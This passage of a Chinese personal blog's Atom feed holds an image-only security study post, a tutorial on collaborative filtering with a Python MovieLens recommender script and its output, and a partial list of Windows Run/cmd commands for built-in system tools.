<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>星星</title>
  
  <subtitle>We are all stardust</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://javastar.club/"/>
  <updated>2019-08-10T14:27:52.230Z</updated>
  <id>http://javastar.club/</id>
  
  <author>
    <name>小星星</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>网络安全入门学习</title>
    <link href="http://javastar.club/archives/aadc8bfc.html"/>
    <id>http://javastar.club/archives/aadc8bfc.html</id>
    <published>2019-08-10T14:14:07.000Z</published>
    <updated>2019-08-10T14:27:52.230Z</updated>
    
    <content type="html"><![CDATA[<p>看雪入门笔记摘抄</p><a id="more"></a><p><img src="https://github.com/starstarb/clouding/raw/master/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%84%E5%9B%BE.jpg" alt></p><p><img src="https://github.com/starstarb/clouding/raw/master/security/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E&amp;%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%8E%9F%E5%9B%BE%E5%8E%BB%E6%8E%89zip%E5%90%8E%E7%BC%80.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看雪入门笔记摘抄&lt;/p&gt;
    
    </summary>
    
      <category term="网络安全" scheme="http://javastar.club/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="http://javastar.club/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>协同过滤算法</title>
    <link href="http://javastar.club/archives/a10feb4a.html"/>
    <id>http://javastar.club/archives/a10feb4a.html</id>
    <published>2019-08-10T08:09:37.000Z</published>
    <updated>2019-08-10T11:33:27.351Z</updated>
    
    <content type="html"><![CDATA[<p>协同过滤算法:<a href="https://blog.csdn.net/DanyHgc/article/details/78910379" rel="external nofollow noopener noreferrer" target="_blank">参考</a></p><a id="more"></a><h3 id="什么是协同过滤"><a href="#什么是协同过滤" class="headerlink" title="什么是协同过滤"></a>什么是协同过滤</h3><p>协同过滤是利用集体智慧的一个典型方法。要理解什么是协同过滤 (Collaborative Filtering, 简称  CF)，首先想一个简单的问题，如果你现在想看个电影，但你不知道具体看哪部，你会怎么做？大部分的人会问问周围的朋友，看看最近有什么好看的电影推荐，而我们一般更倾向于从口味比较类似的朋友那里得到推荐。<br>这就是协同过滤的核心思想。<br>换句话说，就是借鉴和你相关人群的观点来进行推荐，很好理解。</p><h3 id="协同过滤的实现"><a href="#协同过滤的实现" class="headerlink" title="协同过滤的实现"></a>协同过滤的实现</h3><p>要实现协同过滤的推荐算法，要进行以下三个步骤：</p><ol>  <li>收集数据</li>  <li>找到相似用户和物品</li>  <li>进行推荐</li></ol><p><strong>1 收集数据</strong></p><p>  这里的数据指的都是用户的历史行为数据，比如用户的购买历史，关注，收藏行为，或者发表了某些评论，给某个物品打了多少分等等，这些都可以用来作为数据供推荐算法使用，服务于推荐算法。需要特别指出的在于，不同的数据准确性不同，粒度也不同，在使用时需要考虑到噪音所带来的影响。</p><p><strong>2 找到相似用户和物品</strong></p><p>这一步也很简单，其实就是计算用户间以及物品间的相似度。以下是几种计算相似度的方法：<br><img src="https://github.com/starstarb/clouding/raw/master/python/20171227113119804.png" alt></p><p><strong>3 进行推荐</strong></p><p>在知道了如何计算相似度后，就可以进行推荐了。</p><p>在协同过滤中，有两种主流方法：</p><ol>  <li>基于用户的协同过滤</li>  <li>基于物品的协同过滤<br>具体怎么来阐述他们的原理呢，看个图大家就明白了</li></ol><p>基于用户的 CF  的基本思想相当简单，基于用户对物品的偏好找到相邻邻居用户，然后将邻居用户喜欢的推荐给当前用户。计算上，就是将一个用户对所有物品的偏好作为一个向量来计算用户之间的相似度，找到  K 邻居后，根据邻居的相似度权重以及他们对物品的偏好，预测当前用户没有偏好的未涉及物品，计算得到一个排序的物品列表作为推荐。 下图给出了一个例子，对于用户  A，根据用户的历史偏好，这里只计算得到一个邻居 - 用户 C，然后将用户 C 喜欢的物品 D 推荐给用户 A。<br><img src="https://github.com/starstarb/clouding/raw/master/python/xitongguolv1.png" alt></p><p> 基于物品的 CF 的原理和基于用户的 CF  类似，只是在计算邻居时采用物品本身，而不是从用户的角度，即基于用户对物品的偏好找到相似的物品，然后根据用户的历史偏好，推荐相似的物品给他。从计算的角度看，就是将所有用户对某个物品的偏好作为一个向量来计算物品之间的相似度，得到物品的相似物品后，根据用户历史的偏好预测当前用户还没有表示偏好的物品，计算得到一个排序的物品列表作为推荐。下图给出了一个例子，对于物品  A，根据所有用户的历史偏好，喜欢物品 A 的用户都喜欢物品 C，得出物品 A 和物品 C 比较相似，而用户 C 喜欢物品 A，那么可以推断出用户 C  可能也喜欢物品 C。<br><img src="https://github.com/starstarb/clouding/raw/master/python/CF1.png" alt></p><h3 id="算法存在的问题"><a href="#算法存在的问题" class="headerlink" title="算法存在的问题"></a>算法存在的问题</h3><p>这个算法实现起来也比较简单，但是在实际应用中有时候也会有问题的。</p><p>比如一些非常流行的商品可能很多人都喜欢，这种商品推荐给你就没什么意义了，所以计算的时候需要对这种商品加一个权重或者把这种商品完全去掉也行。</p><p>再有，对于一些通用的东西，比如买书的时候的工具书，如现代汉语词典，新华字典神马的，通用性太强了，推荐也没什么必要了。</p><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><p>  　　在非社交网络的网站中，内容内在的联系是很重要的推荐原则，它比基于相似用户的推荐原则更加有效。比如在购书网站上，当你看一本书的时候，推荐引擎会给你推荐相关的书籍，这个推荐的重要性远远超过了网站首页对该用户的综合推荐。可以看到，在这种情况下，Item  CF 的推荐成为了引导用户浏览的重要手段。同时 Item CF  便于为推荐做出解释，在一个非社交网络的网站中，给某个用户推荐一本书，同时给出的解释是某某和你有相似兴趣的人也看了这本书，这很难让用户信服，因为用户可能根本不认识那个人；但如果解释说是因为这本书和你以前看的某本书相似，用户可能就觉得合理而采纳了此推荐。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre>      </td>      <td class="code">        <pre><span class="line">python2.7</span><br><span class="line"># -*- coding=utf-8 -*-</span><br><span class="line"></span><br><span class="line">import math</span><br><span class="line">import sys</span><br><span class="line">from texttable import Texttable</span><br><span class="line"></span><br><span class="line">#   使用 |A&amp;B|/sqrt(|A || B |)计算余弦距离</span><br><span class="line"></span><br><span class="line">def calcCosDistSpe(user1,user2):</span><br><span class="line">    avg_x=0.0</span><br><span class="line">    avg_y=0.0</span><br><span class="line">    for key in user1:</span><br><span class="line">        avg_x+=key[1]</span><br><span class="line">    avg_x=avg_x/len(user1)</span><br><span class="line"></span><br><span class="line">    for key in user2:</span><br><span class="line">        avg_y+=key[1]</span><br><span class="line">    avg_y=avg_y/len(user2)</span><br><span class="line"></span><br><span class="line">    u1_u2=0.0</span><br><span class="line">    for key1 in user1:</span><br><span class="line">        for key2 in user2:</span><br><span class="line">            if key1[1] &gt; avg_x and key2[1]&gt;avg_y and key1[0]==key2[0]:</span><br><span class="line">                u1_u2+=1</span><br><span class="line">    u1u2=len(user1)*len(user2)*1.0</span><br><span class="line">    sx_sy=u1_u2/math.sqrt(u1u2)</span><br><span class="line">    return sx_sy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   计算余弦距离</span><br><span class="line"></span><br><span class="line">def calcCosDist(user1,user2):</span><br><span class="line">    sum_x=0.0</span><br><span class="line">    sum_y=0.0</span><br><span class="line">    sum_xy=0.0</span><br><span class="line">    for key1 in user1:</span><br><span class="line">        for key2 in user2:</span><br><span class="line">            if key1[0]==key2[0] :</span><br><span class="line">                sum_xy+=key1[1]*key2[1]</span><br><span class="line">                sum_y+=key2[1]*key2[1]</span><br><span class="line">                sum_x+=key1[1]*key1[1]</span><br><span class="line"></span><br><span class="line">    if sum_xy == 0.0 :</span><br><span class="line">        return 0</span><br><span class="line">    sx_sy=math.sqrt(sum_x*sum_y) </span><br><span class="line">    return sum_xy/sx_sy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   相似余弦距离</span><br><span class="line"></span><br><span class="line">def calcSimlaryCosDist(user1,user2):</span><br><span class="line">    sum_x=0.0</span><br><span class="line">    sum_y=0.0</span><br><span class="line">    sum_xy=0.0</span><br><span class="line">    avg_x=0.0</span><br><span class="line">    avg_y=0.0</span><br><span class="line">    for key in user1:</span><br><span class="line">        avg_x+=key[1]</span><br><span class="line">    avg_x=avg_x/len(user1)</span><br><span class="line"></span><br><span class="line">    for key in user2:</span><br><span class="line">        avg_y+=key[1]</span><br><span class="line">    avg_y=avg_y/len(user2)</span><br><span class="line"></span><br><span class="line">    for key1 in user1:</span><br><span class="line">        for key2 in user2:</span><br><span class="line">            if key1[0]==key2[0] :</span><br><span class="line">                sum_xy+=(key1[1]-avg_x)*(key2[1]-avg_y)</span><br><span class="line">                sum_y+=(key2[1]-avg_y)*(key2[1]-avg_y)</span><br><span class="line">        sum_x+=(key1[1]-avg_x)*(key1[1]-avg_x)</span><br><span class="line"></span><br><span class="line">    if sum_xy == 0.0 :</span><br><span class="line">        return 0</span><br><span class="line">    sx_sy=math.sqrt(sum_x*sum_y) </span><br><span class="line">    return sum_xy/sx_sy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   读取文件</span><br><span class="line"></span><br><span class="line">def readFile(file_name):</span><br><span class="line">    contents_lines=[]</span><br><span class="line">    f=open(file_name,&quot;r&quot;)</span><br><span class="line">    contents_lines=f.readlines()</span><br><span class="line">    f.close()</span><br><span class="line">    return contents_lines</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   解压rating信息，格式：用户id\t硬盘id\t用户rating\t时间</span><br><span class="line">#   输入：数据集合</span><br><span class="line">#   输出:已经解压的排名信息</span><br><span class="line">#</span><br><span class="line">def getRatingInformation(ratings):</span><br><span class="line">    rates=[]</span><br><span class="line">    for line in ratings:</span><br><span class="line">        rate=line.split(&quot;\t&quot;)</span><br><span class="line">        rates.append([int(rate[0]),int(rate[1]),int(rate[2])])</span><br><span class="line">    return rates</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   生成用户评分的数据结构</span><br><span class="line">#   </span><br><span class="line">#   输入:所以数据 [[2,1,5],[2,4,2]...]</span><br><span class="line">#   输出:1.用户打分字典 2.电影字典</span><br><span class="line">#   使用字典，key是用户id，value是用户对电影的评价，</span><br><span class="line">#   rate_dic[2]=[(1,5),(4,2)].... 表示用户2对电影1的评分是5，对电影4的评分是2</span><br><span class="line"></span><br><span class="line">def createUserRankDic(rates):</span><br><span class="line">    user_rate_dic=&#123;&#125;</span><br><span class="line">    item_to_user=&#123;&#125;</span><br><span class="line">    for i in rates:</span><br><span class="line">        user_rank=(i[1],i[2])</span><br><span class="line">        if i[0] in user_rate_dic:</span><br><span class="line">            user_rate_dic[i[0]].append(user_rank)</span><br><span class="line">        else:</span><br><span class="line">            user_rate_dic[i[0]]=[user_rank]</span><br><span class="line"></span><br><span class="line">        if i[1] in item_to_user:</span><br><span class="line">            item_to_user[i[1]].append(i[0])</span><br><span class="line">        else:</span><br><span class="line">            item_to_user[i[1]]=[i[0]]</span><br><span class="line"></span><br><span class="line">    return user_rate_dic,item_to_user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   计算与指定用户最相近的邻居</span><br><span class="line">#   输入:指定用户ID，所以用户数据，所以物品数据</span><br><span class="line">#   输出:与指定用户最相邻的邻居列表</span><br><span class="line">#</span><br><span class="line">def calcNearestNeighbor(userid,users_dic,item_dic):</span><br><span class="line">    neighbors=[]</span><br><span class="line">    #neighbors.append(userid)</span><br><span class="line">    for item in users_dic[userid]:</span><br><span class="line">        for neighbor in item_dic[item[0]]:</span><br><span class="line">            if neighbor != userid and neighbor not in neighbors: </span><br><span class="line">                neighbors.append(neighbor)</span><br><span class="line"></span><br><span class="line">    neighbors_dist=[]</span><br><span class="line">    for neighbor in neighbors:</span><br><span class="line">        dist=calcSimlaryCosDist(users_dic[userid],users_dic[neighbor])  #calcSimlaryCosDist  calcCosDist calcCosDistSpe</span><br><span class="line">        neighbors_dist.append([dist,neighbor])</span><br><span class="line">    neighbors_dist.sort(reverse=True)</span><br><span class="line">    #print neighbors_dist</span><br><span class="line">    return  neighbors_dist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   使用UserFC进行推荐</span><br><span class="line">#   输入：文件名,用户ID,邻居数量</span><br><span class="line">#   输出：推荐的电影ID,输入用户的电影列表,电影对应用户的反序表，邻居列表</span><br><span class="line">#</span><br><span class="line">def recommendByUserFC(file_name,userid,k=5):</span><br><span class="line"></span><br><span class="line">    #读取文件数据</span><br><span class="line">    test_contents=readFile(file_name)</span><br><span class="line"></span><br><span class="line">    #文件数据格式化成二维数组 List[[用户id,电影id,电影评分]...] </span><br><span class="line">    test_rates=getRatingInformation(test_contents)</span><br><span class="line"></span><br><span class="line">    #格式化成字典数据 </span><br><span class="line">    #    1.用户字典：dic[用户id]=[(电影id,电影评分)...]</span><br><span class="line">    #    2.电影字典：dic[电影id]=[用户id1,用户id2...]</span><br><span class="line">    test_dic,test_item_to_user=createUserRankDic(test_rates)</span><br><span class="line"></span><br><span class="line">    #寻找邻居</span><br><span class="line">    neighbors=calcNearestNeighbor(userid,test_dic,test_item_to_user)[:k]</span><br><span class="line"></span><br><span class="line">    recommend_dic=&#123;&#125;</span><br><span class="line">    for neighbor in neighbors:</span><br><span class="line">        neighbor_user_id=neighbor[1]</span><br><span class="line">        movies=test_dic[neighbor_user_id]</span><br><span class="line">        for movie in movies:</span><br><span class="line">            #print movie</span><br><span class="line">            if movie[0] not in recommend_dic:</span><br><span class="line">                recommend_dic[movie[0]]=neighbor[0]</span><br><span class="line">            else:</span><br><span class="line">                recommend_dic[movie[0]]+=neighbor[0]</span><br><span class="line">    #print len(recommend_dic)</span><br><span class="line"></span><br><span class="line">    #建立推荐列表</span><br><span class="line">    recommend_list=[]</span><br><span class="line">    for key in recommend_dic:</span><br><span class="line">        #print key</span><br><span class="line">        recommend_list.append([recommend_dic[key],key])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    recommend_list.sort(reverse=True)</span><br><span class="line">    #print recommend_list</span><br><span class="line">    user_movies = [ i[0] for i in test_dic[userid]]</span><br><span class="line"></span><br><span class="line">    return [i[1] for i in recommend_list],user_movies,test_item_to_user,neighbors</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   获取电影的列表</span><br><span class="line"></span><br><span class="line">def getMoviesList(file_name):</span><br><span class="line">    #print sys.getdefaultencoding()</span><br><span class="line">    movies_contents=readFile(file_name)</span><br><span class="line">    movies_info=&#123;&#125;</span><br><span class="line">    for movie in movies_contents:</span><br><span class="line">        movie_info=movie.split(&quot;|&quot;)</span><br><span class="line">        movies_info[int(movie_info[0])]=movie_info[1:]</span><br><span class="line">    return movies_info</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#主程序</span><br><span class="line">#输入 ： 测试数据集合</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    reload(sys)</span><br><span class="line">    sys.setdefaultencoding(&apos;utf-8&apos;)</span><br><span class="line">    movies=getMoviesList(&quot;/Users/wuyinghao/Downloads/ml-100k/u.item&quot;)</span><br><span class="line">    recommend_list,user_movie,items_movie,neighbors=recommendByUserFC(&quot;/Users/wuyinghao/Downloads/ml-100k/u.data&quot;,179,80)</span><br><span class="line">    neighbors_id=[ i[1] for i in neighbors]</span><br><span class="line">    table = Texttable()</span><br><span class="line">    table.set_deco(Texttable.HEADER)</span><br><span class="line">    table.set_cols_dtype([&apos;t&apos;,  # text </span><br><span class="line">                          &apos;t&apos;,  # float (decimal)</span><br><span class="line">                          &apos;t&apos;]) # automatic</span><br><span class="line">    table.set_cols_align([&quot;l&quot;, &quot;l&quot;, &quot;l&quot;])</span><br><span class="line">    rows=[]</span><br><span class="line">    rows.append([u&quot;movie name&quot;,u&quot;release&quot;, u&quot;from userid&quot;])</span><br><span class="line">    for movie_id in recommend_list[:20]:</span><br><span class="line">        from_user=[]</span><br><span class="line">        for user_id in items_movie[movie_id]:</span><br><span class="line">            if user_id in neighbors_id:</span><br><span class="line">                from_user.append(user_id)</span><br><span class="line">        rows.append([movies[movie_id][0],movies[movie_id][1],&quot;&quot;])</span><br><span class="line">    table.add_rows(rows)</span><br><span class="line">    print table.draw()</span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line">结果</span><br><span class="line">movie name                release     </span><br><span class="line">=======================================================</span><br><span class="line">Contact (1997)                11-Jul-1997               </span><br><span class="line">Scream (1996)                 20-Dec-1996               </span><br><span class="line">Liar Liar (1997)              21-Mar-1997               </span><br><span class="line">Saint, The (1997)             14-Mar-1997               </span><br><span class="line">English Patient, The (1996)   15-Nov-1996               </span><br><span class="line">Titanic (1997)                01-Jan-1997               </span><br><span class="line">Air Force One (1997)          01-Jan-1997               </span><br><span class="line">Star Wars (1977)              01-Jan-1977               </span><br><span class="line">Conspiracy Theory (1997)      08-Aug-1997               </span><br><span class="line">Toy Story (1995)              01-Jan-1995               </span><br><span class="line">Fargo (1996)                  14-Feb-1997</span><br></pre>      </td>    </tr>  </table></figure><p>数据集： <a href="http://files.grouplens.org/datasets/movielens/" rel="external nofollow noopener noreferrer" target="_blank">http://files.grouplens.org/datasets/movielens/</a></p><p>下载ml-100k.zip即可</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;协同过滤算法:&lt;a href=&quot;https://blog.csdn.net/DanyHgc/article/details/78910379&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;参考&lt;/a&gt;
&lt;/p&gt;
    
    </summary>
    
      <category term="算法" scheme="http://javastar.club/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="python" scheme="http://javastar.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>cmd快捷键</title>
    <link href="http://javastar.club/archives/d63050d8.html"/>
    <id>http://javastar.club/archives/d63050d8.html</id>
    <published>2019-08-10T02:58:29.000Z</published>
    <updated>2019-08-10T03:01:44.313Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://github.com/starstarb/clouding/raw/master/picture/5.jpg" alt></p><a id="more"></a><p>CMD命令：开始－&gt;运行－&gt;键入cmd或command（在命令行里可以看到系统版本、文件系统版本）<br>chcp  修改默认字符集<br>chcp 936默认中文<br>chcp 65001</p><ol>  <li>appwiz.cpl：程序和功能 </li>  <li>calc：启动计算器 </li></ol><ol start="5">  <li>    <p>chkdsk.exe：Chkdsk磁盘检查（管理员身份运行命令提示符） </p>  </li>  <li>    <p>cleanmgr: 打开磁盘清理工具 </p>  </li></ol><ol start="9">  <li>    <p>cmd.exe：CMD命令提示符 </p>  </li>  <li>    <p>自动关机命令<br>　 Shutdown -s -t 600：表示600秒后自动关机<br>　 shutdown -a ：可取消定时关机<br>　      Shutdown -r -t 600：表示600秒后自动重启      　</p>  </li>  <li>    <p>CompMgmtLauncher：计算机管理 </p>  </li>  <li>    <p>compmgmt.msc：计算机管理 </p>  </li>  <li>    <p>credwiz：备份或还原储存的用户名和密码 </p>  </li>  <li>    <p>control：控制面版 </p>  </li>  <li>    <p>dcomcnfg：打开系统组件服务 </p>  </li>  <li>    <p>devmgmt.msc：设备管理器 </p>  </li>  <li>    <p>desk.cpl：屏幕分辨率 </p>  </li>  <li>    <p>dfrgui：优化驱动器 Windows 7→dfrg.msc：磁盘碎片整理程序 </p>  </li>  <li>    <p>dialer：电话拨号程序 </p>  </li>  <li>    <p>diskmgmt.msc：磁盘管理 </p>  </li>  <li>    <p>dvdplay：DVD播放器 </p>  </li>  <li>    <p>dxdiag：检查DirectX信息 </p>  </li>  <li>    <p>eudcedit：造字程序 </p>  </li>  <li>    <p>eventvwr：事件查看器 </p>  </li>  <li>    <p>explorer：打开资源管理器 </p>  </li>  <li>    <p>Firewall.cpl：Windows防火墙 </p>  </li>  <li>    <p>fsmgmt.msc：共享文件夹管理器 </p>  </li>  <li>    <p>gpedit.msc：组策略 </p>  </li>  <li>    <p>hdwwiz.cpl：设备管理器 </p>  </li>  <li>    <p>inetcpl.cpl：Internet属性 </p>  </li>  <li>    <p>intl.cpl：区域 </p>  </li>  <li>    <p>iexpress：木马捆绑工具，系统自带 </p>  </li>  <li>    <p>joy.cpl：游戏控制器 </p>  </li>  <li>    <p>logoff：注销命令 </p>  </li>  <li>    <p>lusrmgr.msc：本地用户和组 </p>  </li>  <li>    <p>lpksetup：语言包安装/删除向导，安装向导会提示下载语言包 </p>  </li>  <li>    <p>lusrmgr.msc：本机用户和组 </p>  </li>  <li>    <p>main.cpl：鼠标属性 </p>  </li>  <li>    <p>mmsys.cpl：声音 </p>  </li>  <li>    <p>mem.exe：显示内存使用情况（如果直接运行无效，可以先管理员身份运行命令提示符，在命令提示符里输入mem.exe&gt;d:a.txt      即可打开d盘查看a.txt，里面的就是内存使用情况了。当然什么盘什么文件名可自己决定。） </p>  </li></ol><ol start="47">  <li>    <p>mmc：打开控制台 </p>  </li>  <li>    <p>mobsync：同步命令 </p>    <ol start="50">      <li>Msconfig.exe：系统配置实用程序 </li>    </ol>  </li>  <li>    <p>msdt：微软支持诊断工具 </p>  </li>  <li>    <p>msinfo32：系统信息 </p>  </li>  <li>    <p>mspaint：画图 </p>  </li>  <li>    <p>Msra：Windows远程协助 </p>  </li>  <li>    <p>mstsc：远程桌面连接 </p>  </li>  <li>    <p>NAPCLCFG.MSC：客户端配置 </p>  </li>  <li>    <p>ncpa.cpl：网络连接 </p>  </li>  <li>    <p>narrator：屏幕“讲述人” </p>  </li>  <li>    <p>Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项 </p>  </li>  <li>    <p>netstat : an(TC)命令检查接口 </p>  </li>  <li>    <p>notepad：打开记事本 </p>  </li>  <li>    <p>Nslookup：IP地址侦测器 </p>  </li>  <li>    <p>odbcad32：ODBC数据源管理器 </p>  </li>  <li>    <p>OptionalFeatures：打开“打开或关闭Windows功能”对话框 </p>  </li></ol><ol start="65">  <li>osk：打开屏幕键盘 </li>  <li>perfmon.msc：计算机性能监测器 </li>  <li>perfmon：计算机性能监测器 </li>  <li>PowerShell：提供强大远程处理能力 </li>  <li>printmanagement.msc：打印管理 </li>  <li>powercfg.cpl：电源选项 </li>  <li>psr：问题步骤记录器 </li>  <li>Rasphone：网络连接 </li>  <li>Recdisc：创建系统修复光盘 </li>  <li>Resmon：资源监视器 </li>  <li>Rstrui：系统还原 </li>  <li>regedit.exe：注册表 </li>  <li>regedt32：注册表编辑器 </li>  <li>rsop.msc：组策略结果集 </li>  <li>sdclt：备份状态与配置，就是查看系统是否已备份 </li>  <li>secpol.msc：本地安全策略 </li>  <li>services.msc：本地服务设置 </li>  <li>sfc /scannow：扫描错误并复原/windows文件保护 </li>  <li>sfc.exe：系统文件检查器 </li>  <li>shrpubw：创建共享文件夹 </li>  <li>sigverif：文件签名验证程序 </li>  <li>slui：Windows激活，查看系统激活信息 </li>  <li>slmgr.vbs -dlv ：显示详细的许可证信息<br>　 slmgr.vbs -dli ：显示许可证信息<br>　 slmgr.vbs    -xpr ：当前许可证截止日期<br>　 slmgr.vbs -dti ：显示安装ID 以进行脱机激<br>　 slmgr.vbs -ipk    ：(Product Key)安装产品密钥<br>　 slmgr.vbs -ato ：激活Windows<br>　 slmgr.vbs -cpky    ：从注册表中清除产品密钥（防止泄露引起的攻击）<br>　 slmgr.vbs -ilc ：(License file)安装许可证<br>　    slmgr.vbs -upk ：卸载产品密钥<br>　 slmgr.vbs -skms ：(name[ort] )批量授权 </li>  <li>snippingtool：截图工具，支持无规则截图 </li>  <li>soundrecorder：录音机，没有录音时间的限制 </li>  <li>StikyNot：便笺 </li>  <li>sysdm.cpl：系统属性 </li>  <li>sysedit：系统配置编辑器 </li>  <li>syskey：系统加密，一旦加密就不能解开，保护系统的双重密码 </li>  <li>taskmgr：任务管理器（旧版） </li>  